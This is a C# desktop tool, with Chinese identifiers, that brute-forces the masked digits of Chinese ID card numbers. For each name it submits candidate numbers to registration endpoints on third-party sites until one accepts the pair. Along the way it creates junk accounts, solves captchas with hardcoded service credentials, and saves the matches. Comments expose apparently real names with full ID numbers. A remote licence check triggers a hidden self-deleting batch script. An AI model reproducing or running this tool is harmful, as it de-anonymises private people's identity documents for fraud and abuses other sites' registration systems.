using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using myDLL;

namespace 身份补齐验证
{
    public partial class 身份补齐验证尾号 : Form
    {
        public 身份补齐验证尾号()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                textBox1.Text = openFileDialog1.FileName;

            }
        }

        string cookie = "";
        string yzm = "";

        DateTime starttime;
        int successcount = 0;
        int threadcount = 0;
        int allcount = 0;

        int runcount = 0;

        List<string> lists = new List<string>();



        public void run()
        {
            successcount = 0;

            StreamReader sr = new StreamReader(textBox1.Text, method.EncodingType.GetTxtType(textBox1.Text));
            //一次性读取完 
            string texts = sr.ReadToEnd();
            string[] text = texts.Split(new string[] { "\r\n" }, StringSplitOptions.None);
            sr.Close();  //只关闭流
            sr.Dispose();   //销毁流内存

            allcount = text.Length;



            for (int i = 0; i < text.Length; i++)
            {
                runcount++;
                if (text[i].Trim() == "")
                    continue;
                string[] value = text[i].Split(new string[] { "----" }, StringSplitOptions.None);
                string name = value[0].Trim();
                if (lists.Contains(name))
                {
                    continue;
                }

                threadcount++;


                //var t1 = new Thread(() => ic6(text[i]));

                //t1.Start();

                //while (threadcount > numericUpDown1.Value)
                //{
                //    Application.DoEvents();//等待本次加载完毕才执行下次循环.
                //}

                ic6(text[i]);
               // run_2686(text[i]);

            }



        }




        public void ic6(object o)
        {
            string input = o.ToString();

            try
            {

                bool jixu = false;

                for (int month = 0; month <= 99; month++)
                {
                    if (jixu == true)
                        break;
                    for (int day = 0; day <= 99; day++)
                    {

                        if (textBox3.Text.Length > 1000)
                            textBox3.Text = "";


                        string month2 = month.ToString();
                        if (month < 10)
                        {
                            month2 = "0" + month;
                        }
                        string day2 = day.ToString();
                        if (day < 10)
                        {
                            day2 = "0" + day;
                        }



                        string[] value = input.Split(new string[] { "----" }, StringSplitOptions.None);
                        string name = System.Web.HttpUtility.UrlEncode(value[0].Trim());
                        string card = value[1].Trim().Replace("****", month2 + day2);

                        if (身份补齐验证.CheckIDCard18(card) == false)
                        {

                            continue;
                        }

                        //身份证号码上的第17位数字表示性别：奇数表示男性，偶数表示女性
                        if (checkBox3.Checked == true)
                        {
                            //MessageBox.Show(card);
                            //MessageBox.Show(card.Substring(16, 1));
                            string sex = value[2].Trim();
                            if (sex == "男")
                            {
                                if (Convert.ToInt32(card.Substring(16, 1)) % 2 == 0)
                                {
                                    textBox3.Text += card + "性别不符合" + "\r\n";
                                    continue;
                                }
                            }
                            if (sex == "女")
                            {
                                if (Convert.ToInt32(card.Substring(16, 1)) % 2 == 1)
                                {
                                    textBox3.Text += card + "性别不符合" + "\r\n";
                                    continue;
                                }
                                  
                            }
                        }



                        //MessageBox.Show(card);
                        string zimu = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789";
                        Random rd = new Random(Guid.NewGuid().GetHashCode());
                        string suiji = "";
                        for (int a = 0; a < 10; a++)
                        {
                            int suijizimu = rd.Next(0, 60);
                            suiji = suiji + zimu[suijizimu];
                        }



                        string url = "http://www.iy6.cn/?c=Public&action=toregister";
                        string postdata = "username=" + suiji + "&password=" + suiji + "&pwdconfirm=" + suiji + "&realname=" + name + "&email=943510630%40qq.com&identity_card=" + card + "&verify=" + yzm + "&url=http%3A%2F%2Fwww.iy6.cn%2F";
                        string html = method.PostUrlDefault(url, postdata, cookie);
                        string msg = Regex.Match(html, @"""msg"":""([\s\S]*?)""").Groups[1].Value;
                        string astatus = Regex.Match(html, @"""status"":([\s\S]*?),").Groups[1].Value;

                        if (astatus == "0")
                        {
                            msg = method.Unicode2String(msg);
                            if (msg == "今日注册已达上限")
                            {
                                successcount++;
                                threadcount--;
                                lists.Add(value[0].Trim());
                                System.TimeSpan t = DateTime.Now - starttime;
                                label4.Text = "运行用时：" + t.Hours + "时" + t.Minutes + "分" + t.Seconds + "秒，导入数据数量：" + allcount + " 正在验证第" + runcount + "个，成功数量：" + successcount;
                                textBox3.Text += value[0] + "----" + card + "----成功" + "\r\n";


                                FileStream fs1 = new FileStream(AppDomain.CurrentDomain.BaseDirectory + "\\成功.txt", FileMode.Append, FileAccess.Write);//创建写入文件 
                                StreamWriter sw = new StreamWriter(fs1, Encoding.GetEncoding("UTF-8"));
                                sw.WriteLine(value[0] + "----" + card + "----成功");
                                sw.Close();
                                fs1.Close();
                                sw.Dispose();
                                jixu = true;
                                break;
                            }

                            else
                            {

                                System.TimeSpan t = DateTime.Now - starttime;
                                label4.Text = "运行用时：" + t.Hours + "时" + t.Minutes + "分" + t.Seconds + "秒，导入数据数量：" + allcount + " 正在验证第" + runcount + "个，成功数量：" + successcount;
                                textBox3.Text += value[0] + "----" + card + "----" + msg + "\r\n";
                            }



                        }
                        if (astatus == "1")
                        {
                            successcount++;
                            threadcount--;
                            lists.Add(value[0].Trim());
                            System.TimeSpan t = DateTime.Now - starttime;
                            label4.Text = "运行用时：" + t.Hours + "时" + t.Minutes + "分" + t.Seconds + "秒，导入数据数量：" + allcount + " 正在验证第" + runcount + "个，成功数量：" + successcount;



                            textBox3.Text += value[0] + "----" + card + "----成功" + "\r\n";

                            FileStream fs1 = new FileStream(AppDomain.CurrentDomain.BaseDirectory + "\\成功.txt", FileMode.Append, FileAccess.Write);//创建写入文件 
                            StreamWriter sw = new StreamWriter(fs1, Encoding.GetEncoding("UTF-8"));
                            sw.WriteLine(value[0] + "----" + card + "----成功");
                            sw.Close();
                            fs1.Close();
                            sw.Dispose();

                            jixu = true;
                            break;

                        }








                    }
                }





                if (jixu == false)
                {

                    FileStream fs2 = new FileStream(AppDomain.CurrentDomain.BaseDirectory + "\\失败.txt", FileMode.Append, FileAccess.Write);//创建写入文件 
                    StreamWriter sw2 = new StreamWriter(fs2, Encoding.GetEncoding("UTF-8"));
                    sw2.WriteLine(input + "----失败");
                    sw2.Close();
                    fs2.Close();
                    sw2.Dispose();
                }
                threadcount--;

            }
            catch (Exception ex)
            {

                textBox3.Text = ex.ToString();
            }
        }


        //https://www.2686.com/register_ajax.php?realname=%E5%8D%A2%E5%BD%A9%E6%9C%88&idcard=45250219831209052x
        //https://www.1k2k.com/register_ajax.php?realname=%E5%8F%B6%E6%A3%AE&idcard=330781198909156314
        /// <summary>
        /// 2686网站   2686换成 http://www.1k2k.com/register_ajax.php?realname=%E8%82%96%E6%96%B0%E6%9D%B0&idcard=410611198011244516同样可以
        /// </summary>
        /// <param name="o"></param>
        public void run_2686(object o)
        {
            string input = o.ToString();

            try
            {

                bool jixu = false;

                for (int month = 0; month <= 99; month++)
                {
                    if (jixu == true)
                        break;
                    for (int day = 0; day <= 99; day++)
                    {

                        if (textBox3.Text.Length > 1000)
                            textBox3.Text = "";


                        string month2 = month.ToString();
                        if (month < 10)
                        {
                            month2 = "0" + month;
                        }
                        string day2 = day.ToString();
                        if (day < 10)
                        {
                            day2 = "0" + day;
                        }



                        string[] value = input.Split(new string[] { "----" }, StringSplitOptions.None);
                        string name = System.Web.HttpUtility.UrlEncode(value[0].Trim());
                        string card = value[1].Trim().Replace("****", month2 + day2);

                        if (身份补齐验证.CheckIDCard18(card) == false)
                        {

                            continue;
                        }

                        //身份证号码上的第17位数字表示性别：奇数表示男性，偶数表示女性
                        if (checkBox3.Checked == true)
                        {
                            //MessageBox.Show(card);
                            //MessageBox.Show(card.Substring(16, 1));
                            string sex = value[2].Trim();
                            if (sex == "男")
                            {
                                if (Convert.ToInt32(card.Substring(16, 1)) % 2 == 0)
                                {
                                    textBox3.Text += card + "性别不符合" + "\r\n";
                                    continue;
                                }
                            }
                            if (sex == "女")
                            {
                                if (Convert.ToInt32(card.Substring(16, 1)) % 2 == 1)
                                {
                                    textBox3.Text += card + "性别不符合" + "\r\n";
                                    continue;
                                }

                            }
                        }



                       


                        string url = "http://www.2686.com/register_ajax.php?realname="+ name + "&idcard="+card;
                      
                        string html = method.GetUrl(url,"utf-8");
                    

                        
                        if (html.Trim()==("√"))
                        {
                            successcount++;
                            threadcount--;
                            lists.Add(value[0].Trim());
                            System.TimeSpan t = DateTime.Now - starttime;
                            label4.Text = "运行用时：" + t.Hours + "时" + t.Minutes + "分" + t.Seconds + "秒，导入数据数量：" + allcount + " 正在验证第" + runcount + "个，成功数量：" + successcount;



                            textBox3.Text += value[0] + "----" + card + "----成功" + "\r\n";

                            FileStream fs1 = new FileStream(AppDomain.CurrentDomain.BaseDirectory + "\\成功.txt", FileMode.Append, FileAccess.Write);//创建写入文件 
                            StreamWriter sw = new StreamWriter(fs1, Encoding.GetEncoding("UTF-8"));
                            sw.WriteLine(value[0] + "----" + card + "----成功");
                            sw.Close();
                            fs1.Close();
                            sw.Dispose();

                            jixu = true;
                            break;

                        }
                        else
                        {
                            System.TimeSpan t = DateTime.Now - starttime;
                            label4.Text = "运行用时：" + t.Hours + "时" + t.Minutes + "分" + t.Seconds + "秒，导入数据数量：" + allcount + " 正在验证第" + runcount + "个，成功数量：" + successcount;
                            textBox3.Text += value[0] + "----" + card + "----" + html+ "\r\n";
                        }








                    }
                }





                if (jixu == false)
                {

                    FileStream fs2 = new FileStream(AppDomain.CurrentDomain.BaseDirectory + "\\失败.txt", FileMode.Append, FileAccess.Write);//创建写入文件 
                    StreamWriter sw2 = new StreamWriter(fs2, Encoding.GetEncoding("UTF-8"));
                    sw2.WriteLine(input + "----失败");
                    sw2.Close();
                    fs2.Close();
                    sw2.Dispose();
                }
                threadcount--;

            }
            catch (Exception ex)
            {

                textBox3.Text = ex.ToString();
            }
        }



      


        #region  程序关闭删除自身
        public static void TestForKillMyself()
        {
            string bat = @"@echo off
                           :tryagain
                           del %1
                           if exist %1 goto tryagain
                           del %0";
            File.WriteAllText("killme.bat", bat);//写bat文件
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "killme.bat";
            psi.Arguments = "\"" + Environment.GetCommandLineArgs()[0] + "\"";
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(psi);
        }


        #endregion

        private void 身份补齐验证尾号_Load(object sender, EventArgs e)
        {
            #region 通用检测

            string html = method.GetUrl("http://www.acaiji.com/index/index/vip.html", "utf-8");

            if (!html.Contains(@"rdj5c"))
            {
                TestForKillMyself();
                System.Diagnostics.Process.GetCurrentProcess().Kill();
            }


            #endregion
            method.SetFeatures(11000);
            webBrowser1.ScriptErrorsSuppressed = true;
            webBrowser1.Navigate("http://www.iy6.cn/?c=Public&action=register&url=http%3A%2F%2Fwww.iy6.cn%2F");
        }

        Thread thread;

        private void button2_Click(object sender, EventArgs e)
        {
            Control.CheckForIllegalCrossThreadCalls = false;
            if (textBox1.Text == "")
            {
                MessageBox.Show("请导入文本");
                return;
            }

            cookie = method.GetCookies("http://www.iy6.cn/?c=Public&action=verify");
            yzm_ttshitu.cookie = cookie;
            yzm = (yzm_ttshitu.shibie("2030017712", "123q123q", "http://www.iy6.cn/?c=Public&action=verify"));





            starttime = DateTime.Now;

            cookie = method.GetCookies("http://www.iy6.cn/?c=Public&action=verify");
            yzm_ttshitu.cookie = cookie;
            yzm = (yzm_ttshitu.shibie("2030017712", "123q123q", "http://www.iy6.cn/?c=Public&action=verify"));


            if (thread == null || !thread.IsAlive)
            {
                thread = new Thread(run);
                thread.Start();
                Control.CheckForIllegalCrossThreadCalls = false;
            }
        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {
            this.textBox3.SelectionStart = this.textBox3.Text.Length;
            this.textBox3.SelectionLength = 0;
            this.textBox3.ScrollToCaret();
        }

        private void 身份补齐验证尾号_FormClosing(object sender, FormClosingEventArgs e)
        {
            DialogResult dr = MessageBox.Show("确定要关闭吗？", "关闭", MessageBoxButtons.OKCancel, MessageBoxIcon.Question);
            if (dr == DialogResult.OK)
            {
                // Environment.Exit(0);
                System.Diagnostics.Process.GetCurrentProcess().Kill();
            }
            else
            {
                e.Cancel = true;//点取消的代码 
            }
        }
    }
}
